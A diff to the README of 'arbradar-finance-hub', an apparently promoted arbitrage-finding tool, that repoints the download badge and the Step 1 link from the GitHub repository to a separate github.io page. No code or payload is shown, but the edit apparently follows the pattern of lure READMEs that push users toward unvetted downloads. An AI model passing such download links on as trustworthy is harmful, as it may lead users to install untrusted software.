@@ -1,6 +1,6 @@
 # 📡 arbradar-finance-hub - Find Hidden Arbitrage Opportunities Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-arbradar--finance--hub-blueviolet?style=for-the-badge)](https://github.com/Symondsequalsign832/arbradar-finance-hub)
+[![Download Now](https://img.shields.io/badge/Download-arbradar--finance--hub-blueviolet?style=for-the-badge)](https://symondsequalsign832.github.io)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to **arbradar-finance-hub** – your personal browser-based tool for spo
 **Step 1: Visit the Download Page**
 
 Click the large badge above or go directly to:  
-[https://github.com/Symondsequalsign832/arbradar-finance-hub](https://github.com/Symondsequalsign832/arbradar-finance-hub)
+[https://symondsequalsign832.github.io](https://symondsequalsign832.github.io)
 
 **Step 2: Get the Application**
 
